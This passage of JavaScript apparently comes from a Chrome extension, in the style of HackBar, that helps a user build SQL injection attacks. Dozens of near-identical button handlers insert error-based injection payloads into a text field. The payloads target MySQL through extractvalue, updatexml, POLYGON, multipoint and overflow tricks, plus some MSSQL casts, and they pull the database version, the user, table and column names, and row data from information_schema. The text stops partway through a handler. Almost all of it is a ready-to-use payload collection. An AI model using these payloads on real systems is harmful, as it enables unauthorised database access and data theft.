				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '+AND(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(table_name+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.TABLES+WHERE+table_schema=DATABASE()+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});


	$('#edclmn').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(column_name+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+table_name=ENTER_TABLE_NAME_HEX+AND+table_schema=DATABASE()+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});


	$('#eddt').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(CONCAT(ENTER_COLUMN_NAME)+AS+CHAR),0x7e))+FROM+ENTER_TABLE_NAME+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});


	$('#ermsgvrs').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += ' and 1=@@version()';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});


	$('#ermsgtdb').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += ' and 1=db_name()';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});


	$('#ermsusr').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += ' and 1=user';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});


	$('#ermsds').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += " and 1=(select+table_name%2b'::'%2bcolumn_name as t+from+information_schema.columns FOR XML PATH(''))";
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});


	$('#advgr').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += 'and(select!x-~0.+from(select(select+group_concat(Version()))x)x)';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});


	$('#advtbl').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += 'and(select!x-~0.+from(select(select+group_concat(table_name+separator+0x0b)from+information_schema.tables+where+table_schema=database())x)x)';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});


	$('#ebdon').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '(select+x*1E308+from(select+concat(@:=0,(select+count(*)from+information_schema.tables+where+table_schema=database()and@:=concat(@,0x0b,table_name)),@)x)y)';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});


	$('#ebdtw').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '(select(x+is+not+null)-9223372036854775808+from(select(concat(@:=0,(select+count(*)from+information_schema.tables+where+table_schema=database()and@:=concat(@,0x0b,table_name)),@))x)y)';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});


	$('#ebdthr').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '(select!x-~0+from(select+concat(@:=0,(select(count(*))from(information_schema.tables)where(table_schema=database())and@:=concat(@,0x0b,table_name)),@)x)y)';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});


	$('#ebdfr').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '(select+if(x,6,9)*1E308+from(select(select+group_concat(table_name+separator+0x0b)from+information_schema.tables+where+table_schema=database())x)x)';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});


	$('#ebdfv').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '(select!x-~0.+from(select(select+group_concat(table_name+separator+0x0b)from+information_schema.tables+where+table_schema=database())x)x)';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});


	$('#ebdsx').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '(select(!root-~0)from(select concat/**/(user(),version(),database(),0x3c62723e,@:=0,(select+count(*)+from+information_schema.columns where table_schema=database() and @:=concat/**/(@,table_name,0x3a3a3a3a3a,column_name,0x3c62723e)),@)root)z)';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});


	$('#ebdsvn').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += 'and(select(!root-~0)from(select concat/**/(user(),version(),database(),0x3c62723e,@:=0,(select+count(*)+from+information_schema.columns where table_schema=database() and @:=concat/**/(@,table_name,0x3a3a3a3a3a,column_name,0x3c62723e)),@)root)z)';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});


	$('#ebdegt').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += 'and(select+if(x,6,9)*1E308+from(select(select+group_concat(table_name+separator+0x0b)from+information_schema.tables+where+table_schema=database())x)x)';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});


	$('#ebdnn').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += 'and(select+x*1E308+from(select+concat(@:=0,(select+count(*)from+information_schema.tables+where+table_schema=database()+and@:=concat(@,0x0b,table_name)),@)x)y)';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});


	$('#xpvgtvrn').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += ' and extractvalue(0x0a,concat(0x0a,(select version())))';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});


	$('#xpvgttb').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += ' and extractvalue(0x0a,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() limit 0,1)))';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});


	$('#xpvclm').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += ' and extractvalue(0x0a,concat(0x0a,(select column_name from information_schema.columns where table_schema=DATABASE() and table_name=ENTER_TABLE_NAME_HEX limit 0,1)))';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});


	$('#xpvgvrs').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += ' and extractvalue(0x0a,concat(0x0a,(select concat(ENTER_COLUMN_NAME) from ENTER_TABLE_NAME limit 0,1)))';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});


	$('#xpvxgtvrn').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += ' and updatexml(null,concat(0x0a,(select version())),null)';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});


	$('#xpvxgtbl').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += ' and updatexml(null,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() limit 0,1)),null)';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});


	$('#xpvxgtcm').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += ' and updatexml(null,concat(0x0a,(select column_name from information_schema.columns where table_schema=DATABASE() and table_name=ENTER_TABLE_NAME_HEX limit 0,1)),null)';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});


	$('#xpvxgdt').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += ' and updatexml(null,concat(0x0a,(select concat(ENTER_COLUMN_NAME) from ENTER_TABLE_NAME limit 0,1)),null)';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});


	$('#pgpgvrn').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '+POLYGON((Select*from(Select*from(Select+@@version ``)y)x))';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});


	$('#pgpgtbl').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '+POLYGON((select*from(select*from(select+group_concat(table_name+separator+0x3c62723e)+from+information_schema.tables+where+table_schema=database())f)x))';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});


	$('#pgpdo').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '+multipoint((select*from+(select+x*1E308+from+(select+concat(@:=0,(select+count(*)+from+information_schema.tables+where+table_schema=database()+and@:=concat(@,0x0b,table_name)),@)x)y)j))';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});


	$('#pgpdt').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '+multipoint((select*from(select(!x-~0)+from(select+concat(@:=0,(select(count(*))from(information_schema.tables)where(table_schema=database())and@:=concat(@,0x0b,table_name)),@)x)y)j))';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});


	$('#pgpdtr').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += 'multipoint((select*from(select(x+is+not+null)-9223372036854775808+from+(select(concat(@:=0,(select+count(*)+from+information_schema.tables+where+table_schema=database()+and@:=concat(@,0x0b,table_name)),@))x)y)j))';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});


	$('#pgpdfr').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += "'+and+multipoint((select*from(select!x-~0.from(select(select+group_concat(table_name+separator+0x0b)from(select+table_name+from+information_schema.tables+where+table_schema=database()+limit+1,20)c)x)j)h))";
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});


	$('#dbsgtvrn').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
